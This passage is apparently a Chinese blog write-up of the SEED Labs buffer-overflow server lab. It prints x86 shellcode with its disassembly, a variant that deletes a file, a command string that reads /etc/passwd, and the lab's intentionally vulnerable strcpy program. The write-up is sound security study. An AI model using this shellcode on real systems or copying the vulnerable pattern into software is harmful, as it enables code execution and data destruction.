<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>缓冲区溢出攻击实验 | Illunight的收藏品</title><meta name="author" content="Illunight"><meta name="copyright" content="Illunight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第二个实验~来自https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;chinese&#x2F;labs&#x2F;Software&#x2F;Buffer_Overflow_Server&#x2F; pwn真是太难了  缓冲区溢出攻击实验 任务 1: 熟悉 Shellcode 由任务书可知，本次任务中的 shellcode 是一段汇编代码的二进制版本，因此我们可以将其翻译为汇编代码。 使用反汇编库 Capstone Engine">
<meta property="og:type" content="article">
<meta property="og:title" content="缓冲区溢出攻击实验">
<meta property="og:url" content="https://xelinquency.github.io/2025/11/26/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/">
<meta property="og:site_name" content="Illunight的收藏品">
<meta property="og:description" content="第二个实验~来自https:&#x2F;&#x2F;seedsecuritylabs.org&#x2F;chinese&#x2F;labs&#x2F;Software&#x2F;Buffer_Overflow_Server&#x2F; pwn真是太难了  缓冲区溢出攻击实验 任务 1: 熟悉 Shellcode 由任务书可知，本次任务中的 shellcode 是一段汇编代码的二进制版本，因此我们可以将其翻译为汇编代码。 使用反汇编库 Capstone Engine">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://xelinquency.github.io/img/404.jpg">
<meta property="article:published_time" content="2025-11-26T05:52:36.000Z">
<meta property="article:modified_time" content="2025-11-26T13:24:04.343Z">
<meta property="article:author" content="Illunight">
<meta property="article:tag" content="实验记录">
<meta property="article:tag" content="DKP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://xelinquency.github.io/img/404.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "缓冲区溢出攻击实验",
  "url": "https://xelinquency.github.io/2025/11/26/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/",
  "image": "https://xelinquency.github.io/img/404.jpg",
  "datePublished": "2025-11-26T05:52:36.000Z",
  "dateModified": "2025-11-26T13:24:04.343Z",
  "author": [
    {
      "@type": "Person",
      "name": "Illunight",
      "url": "https://xelinquency.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://xelinquency.github.io/2025/11/26/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="DBE1_SX4G9tMN1JolnkxhQxmkqC7KxJHBS654vVGjaE"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.json","preload":false,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '缓冲区溢出攻击实验',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/icon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%AC%94%E8%AE%B0/"><i class="fa-fw fas fa-pen-nib"></i><span> 笔记</span></a></div><div class="menus_item"><a class="site-page" href="/friends"><i class="fa-fw fas fa-users-line"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-paw"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/special/"><i class="fa-fw fas fa-clipboard-question"></i><span> ???</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/404.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon.ico" alt="Logo"><span class="site-name">Illunight的收藏品</span></a><a class="nav-page-title" href="/"><span class="site-name">缓冲区溢出攻击实验</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%AC%94%E8%AE%B0/"><i class="fa-fw fas fa-pen-nib"></i><span> 笔记</span></a></div><div class="menus_item"><a class="site-page" href="/friends"><i class="fa-fw fas fa-users-line"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/game/"><i class="fa-fw fas fa-paw"></i><span> 游戏</span></a></li><li><a class="site-page child" href="/special/"><i class="fa-fw fas fa-clipboard-question"></i><span> ???</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">缓冲区溢出攻击实验</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-11-26T05:52:36.000Z" title="发表于 2025-11-26 13:52:36">2025-11-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-11-26T13:24:04.343Z" title="更新于 2025-11-26 21:24:04">2025-11-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>25分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>第二个实验~来自<a target="_blank" rel="noopener" href="https://seedsecuritylabs.org/chinese/labs/Software/Buffer_Overflow_Server/">https://seedsecuritylabs.org/chinese/labs/Software/Buffer_Overflow_Server/</a></p>
<p>pwn真是太难了</p>
<hr>
<h1>缓冲区溢出攻击实验</h1>
<h2 id="任务-1-熟悉-Shellcode">任务 1: 熟悉 Shellcode</h2>
<p>由任务书可知，本次任务中的 shellcode 是一段汇编代码的二进制版本，因此我们可以将其翻译为汇编代码。</p>
<p>使用反汇编库 Capstone Engine 来完成我们想要的目的：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 准备 Shellcode</span></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 初始化反汇编器</span></span><br><span class="line"><span class="comment"># CS_ARCH_X86: 架构是 x86</span></span><br><span class="line"><span class="comment"># CS_MODE_32:  模式是 32位</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_32)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;<span class="string">&#x27;地址&#x27;</span>:&lt;<span class="number">10</span>&#125;</span> <span class="subst">&#123;<span class="string">&#x27;指令&#x27;</span>:&lt;<span class="number">10</span>&#125;</span> <span class="subst">&#123;<span class="string">&#x27;操作数&#x27;</span>&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 反汇编</span></span><br><span class="line"><span class="comment"># 0x1000 是我们假设的这段代码在内存中的起始地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(shellcode, <span class="number">0x1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;0x<span class="subst">&#123;i.address:x&#125;</span>:\t<span class="subst">&#123;i.mnemonic&#125;</span>\t<span class="subst">&#123;i.op_str&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到结果：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">地址         指令         操作数</span><br><span class="line">------------------------------</span><br><span class="line">0x1000: jmp     0x102b</span><br><span class="line">0x1002: pop     ebx</span><br><span class="line">0x1003: xor     eax, eax</span><br><span class="line">0x1005: mov     byte ptr [ebx + 9], al</span><br><span class="line">0x1008: mov     byte ptr [ebx + 0xc], al</span><br><span class="line">0x100b: mov     byte ptr [ebx + 0x47], al</span><br><span class="line">0x100e: mov     dword ptr [ebx + 0x48], ebx</span><br><span class="line">0x1011: lea     ecx, [ebx + 0xa]</span><br><span class="line">0x1014: mov     dword ptr [ebx + 0x4c], ecx</span><br><span class="line">0x1017: lea     ecx, [ebx + 0xd]</span><br><span class="line">0x101a: mov     dword ptr [ebx + 0x50], ecx</span><br><span class="line">0x101d: mov     dword ptr [ebx + 0x54], eax</span><br><span class="line">0x1020: lea     ecx, [ebx + 0x48]</span><br><span class="line">0x1023: xor     edx, edx</span><br><span class="line">0x1025: xor     eax, eax</span><br><span class="line">0x1027: mov     al, 0xb</span><br><span class="line">0x1029: int     0x80</span><br><span class="line">0x102b: call    0x1002</span><br></pre></td></tr></table></figure>
<p>解析：</p>
<ul>
<li><strong><code>jmp 0x102b</code></strong>: 程序一开始就跳到了最末尾。</li>
<li><strong><code>call 0x1002</code></strong>: 末尾是一条 <code>call</code> 指令，它跳回头部。
<ul>
<li><code>call</code> 指令有一个副作用，它会把下一条指令的地址压入堆栈。而紧跟在 <code>call</code> 后面的，正是我们要执行的字符串（<code>/bin/bash...</code>），因此 <code>call</code> 指令需要放在最后，从而获取到字符串的地址。</li>
</ul>
</li>
<li><strong><code>pop ebx</code></strong>: 跳回头部后，第一件事就是 <code>pop ebx</code>。这把刚才压入堆栈的地址（也就是字符串的地址）拿了出来，存入 <code>ebx</code> 寄存器。
<ul>
<li>这样，Shellcode 就动态获取了字符串在内存中的位置。</li>
</ul>
</li>
<li><strong><code>mov byte ptr [ebx + ...], al</code></strong>: 这些指令是在把字符串里的占位符（比如 <code>*</code>）替换成 <code>0x00</code>（空字节），因为 shellcode 不能直接包含空字节。</li>
<li><strong><code>dword ptr [ebx + 0x48], ebx</code></strong>: 由上文可看出 <code>[ebx + 0x47]</code> 是 <code>&quot;/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *&quot;</code> 字符串中 <code>*</code> 占位符的地址，因此该指令是将接下来的 <code>AAAA</code> 字符串替换为指令0的地址(<code>argv[0]</code> 的地址)。
<ul>
<li>接下来的操作同理。</li>
</ul>
</li>
<li><strong><code>int 0x80</code></strong>: 最后调用 Linux 内核，执行 <code>/bin/bash</code>。</li>
</ul>
<p>接下来实现删除文件的功能：</p>
<ol>
<li>
<p>修改 shellcode ：将执行代码行修改为<code>&quot;/bin/rm useless_file;                                     *&quot;</code></p>
</li>
<li>
<p>执行：修改原有 Makefile 文件，使得其能够一键运行：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 生成 Shellcode 二进制文件</span></span><br><span class="line"><span class="comment"># 运行前先给予 Python 脚本执行权限，确保不会报 Permission denied</span></span><br><span class="line"><span class="section">gen:</span></span><br><span class="line">	chmod +x shellcode_32.py shellcode_64.py</span><br><span class="line">	./shellcode_32.py</span><br><span class="line">	./shellcode_64.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 一键运行 32 位测试</span></span><br><span class="line"><span class="comment"># 依赖关系: all (确保 .out 已编译), gen (确保 codefile 已生成)</span></span><br><span class="line"><span class="section">run32: all gen</span></span><br><span class="line">	@echo <span class="string">&quot;\n[+] Running 32-bit Shellcode test...&quot;</span></span><br><span class="line">	./a32.out</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 一键运行 64 位测试</span></span><br><span class="line"><span class="section">run64: all gen</span></span><br><span class="line">	@echo <span class="string">&quot;\n[+] Running 64-bit Shellcode test...&quot;</span></span><br><span class="line">	./a64.out</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>运行截图：</p>
<p><img src="%E4%BB%BB%E5%8A%A11-1_%E7%94%9F%E6%88%90useless.png" alt="任务1-1生成useless"></p>
<p><img src="%E4%BB%BB%E5%8A%A11-2_%E5%88%A0%E9%99%A4%E6%88%90%E5%8A%9F.png" alt="任务1-2删除成功"></p>
</li>
</ol>
<h2 id="任务-2：第一关">任务 2：第一关</h2>
<h3 id="服务器">服务器</h3>
<p>按照实验手册指导，得到服务器响应：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">server-1-10.9.0.5 | Got a connection from 10.9.0.1</span><br><span class="line">server-1-10.9.0.5 | Starting stack</span><br><span class="line">server-1-10.9.0.5 | Input size: 6</span><br><span class="line">server-1-10.9.0.5 | Frame Pointer (ebp) inside bof():  0xffffd3f8</span><br><span class="line">server-1-10.9.0.5 | Buffer&#x27;s address inside bof():     0xffffd388</span><br><span class="line">server-1-10.9.0.5 | ==== Returned Properly ====</span><br></pre></td></tr></table></figure>
<p>由此可知：</p>
<ul>
<li>Buffer’s Address: 缓冲区在内存中的起始位置为 <code>0xffffd388</code>。</li>
<li>EBP: 当前栈帧的底部指针为 <code>0xffffd3f8</code>。</li>
</ul>
<h4 id="复习">复习</h4>
<p>为了了解程序在内存中是如何执行的，接下来我们来复习操作系统相关部分的知识：</p>
<p>源漏洞程序 <code>stack.c</code> 的部分源代码为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 更改此值将改变堆栈布局。</span></span><br><span class="line"><span class="comment">* 教师可以每年更改此值，以防止学生使用过往的答案。 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line">    <span class="comment">/* 下面的语句存在缓冲区溢出问题 */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    bof(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">    <span class="type">int</span> length = fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    foo(str);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;==== Returned Properly ====\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>32位 Linux 的进程虚拟内存模型为：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">高地址 (0xFFFFFFFF)</span><br><span class="line">+----------------------+ </span><br><span class="line">|  Kernel Space        |  &lt;-- 操作系统内核空间 (用户态不可访问)</span><br><span class="line">+----------------------+ &lt;--- 0xC0000000 (3GB边界)</span><br><span class="line">|  Stack (栈)          |  &lt;-- 存放函数调用、局部变量</span><br><span class="line">|      ↓ (向下生长)     |     </span><br><span class="line">|                      |</span><br><span class="line">|         ...          |</span><br><span class="line">|                      |</span><br><span class="line">|      ↑ (向上生长)     |</span><br><span class="line">|  Heap (堆)           |  &lt;-- 动态分配内存 (malloc/new)</span><br><span class="line">+----------------------+</span><br><span class="line">|  BSS Segment         |  &lt;-- 未初始化的全局变量</span><br><span class="line">+----------------------+</span><br><span class="line">|  Data Segment        |  &lt;-- 已初始化的全局变量 (static var)</span><br><span class="line">+----------------------+</span><br><span class="line">|  Text Segment        |  &lt;-- 代码段 (二进制机器码，只读)</span><br><span class="line">+----------------------+</span><br><span class="line">低地址 (0x00000000)</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>在函数调用的时候，操作系统为该函数在<strong>栈</strong>上分配一块连续内存区域，它用于存储函数执行过程中所需的<strong>上下文信息</strong>，包括局部变量、参数、返回地址等，该上下文信息被称为<strong>栈帧</strong>。</p>
<ul>
<li>32位 x86 架构的函数调用步骤为：
<ul>
<li>调用方 (foo) ：<code>push</code> 参数。</li>
<li>调用方 (foo) ：执行 <code>call function</code> 指令。
<ul>
<li>CPU 自动把 <strong>Return Address</strong>（调用方 foo 中的 <code>call function</code> 的下一行指令的地址）压入栈。</li>
<li>PC 跳转到 <code>bof</code> 的代码地址。</li>
</ul>
</li>
<li>被调用方 (bof) 动作：执行函数序言（Prologue）。
<ul>
<li><code>push ebp</code>（保存旧底座）。</li>
<li><code>mov ebp, esp</code>（建立新底座）。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>典型栈帧的组成结构为：</p>
</li>
<li>
<table>
<thead>
<tr>
<th style="text-align:left">部分</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">参数传递区域</td>
<td style="text-align:left">存储传入函数的参数（如 <code>func(a, b);</code> 中的 a 和 b）。</td>
</tr>
<tr>
<td style="text-align:left">返回地址</td>
<td style="text-align:left">保存函数调用结束后，程序计数器（PC）应回到的位置（即调用函数的下一条指令地址）。</td>
</tr>
<tr>
<td style="text-align:left">调用者的栈帧指针（原有的 ebp）</td>
<td style="text-align:left">保存前一个栈帧的基址指针（如 <code>ebp</code>/<code>rbp</code>），用于恢复调用函数的栈帧。</td>
</tr>
<tr>
<td style="text-align:left">局部变量</td>
<td style="text-align:left">存储函数内部定义的局部变量（如 <code>int a = 10;</code>）。</td>
</tr>
<tr>
<td style="text-align:left">临时数据</td>
<td style="text-align:left">编译器生成的临时变量（如表达式计算的中间结果）。</td>
</tr>
<tr>
<td style="text-align:left">寄存器保存区</td>
<td style="text-align:left">保存需要恢复的寄存器状态（如 <code>ebx</code>、<code>esi</code> 等）。</td>
</tr>
</tbody>
</table>
<ul>
<li>
<p>关键信息：</p>
<ul>
<li>
<p>返回地址 (Return Address): 当前函数执行完后，需要返回的地址。</p>
<ul>
<li>
<p>例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">地址 | 	代码段</span><br><span class="line"><span class="number">1</span>		<span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">2		&#123;</span><br><span class="line"><span class="number">3</span>    		<span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="number">4</span>    		<span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"><span class="number">5</span>    		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="number">6</span>		&#125;</span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">8</span>		<span class="type">void</span> <span class="title function_">foo</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">9		&#123;</span><br><span class="line"><span class="number">10</span>		    ...</span><br><span class="line"><span class="number">11</span>		    bof(str);</span><br><span class="line"><span class="number">12</span>		&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>步骤：</p>
<ol>
<li><code>foo</code> 调用 <code>bof</code> 函数，保存 <code>bof(str)</code> 的下一行地址 12</li>
<li>地址跳转到 1，开始执行 <code>bof</code> 函数</li>
<li>执行完毕，使用保存的地址，回到地址 12</li>
</ol>
</li>
</ul>
</li>
<li>
<p>栈底指针 (ebp): 用于定位的指针。</p>
<ul>
<li>
<p>x86 架构中函数调用过程遵循 cdecl 调用约定，即总是按照<code>函数参数 -&gt; 返回地址 -&gt; 原有 ebp 变量</code> 的顺序进行压栈。在压栈后，将新 ebp 的值赋值为最新栈顶的值，即：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push args</span><br><span class="line">call function</span><br><span class="line"></span><br><span class="line">function:</span><br><span class="line">	push ebp      </span><br><span class="line">	mov  ebp, esp </span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后使用<strong>减法指令</strong>为 <code>局部变量</code> 一次性划拨空间，例如 <code>sub esp, 0x64</code> （100字节）。</p>
</li>
<li>
<p>多个函数参数的压栈顺序是从右到左，这样可以实现从低地址到高地址分别为参数1，参数2…</p>
</li>
<li>
<p>内存的状态（从上到下为高地址到低地址），因此我们能够通过 <code>ebp</code> 的值来索引栈帧的内容：</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>内容</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x100c</td>
